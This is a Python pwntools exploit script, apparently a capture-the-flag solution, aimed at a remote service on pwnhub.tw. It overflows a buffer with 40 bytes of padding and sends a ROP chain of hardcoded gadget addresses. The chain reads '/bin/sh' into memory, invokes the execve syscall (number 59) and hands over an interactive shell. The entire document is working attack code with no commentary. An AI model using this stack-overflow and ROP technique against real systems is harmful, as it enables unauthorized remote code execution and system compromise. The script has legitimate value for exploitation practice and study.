#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'

r = remote('pwnhub.tw', 8361)
#r = remote('127.0.0.1', 7122)

push_rbp_ret = 0x4c6a4e
pop_rdi_ret = 0x401456
pop_rdx_rsi_ret = 0x442809
mov_rax_rbp_pop3_ret = 0x4636b8
mov_rdi_rbp_pop_rbx_rbp_jmp_rax = 0x41f416
pop_rax_rdx_rbx_ret = 0x0478516
mov_rax_rdi = 0x04396aa
syscall = 0x4671b5

buf = 0x6cad57

rop = [
	# read to buf ret 59
	pop_rdx_rsi_ret,
	59,
	buf,
	pop_rdi_ret,
	0,
	mov_rax_rdi,
	syscall,

	pop_rdi_ret,
	buf,
	pop_rdx_rsi_ret,
	0,
	0,
	syscall
]

r.sendline('A'*40+flat(rop))
sleep(0.2)
r.sendline('/bin/sh\x00'.ljust(58, 'A'))
r.interactive()



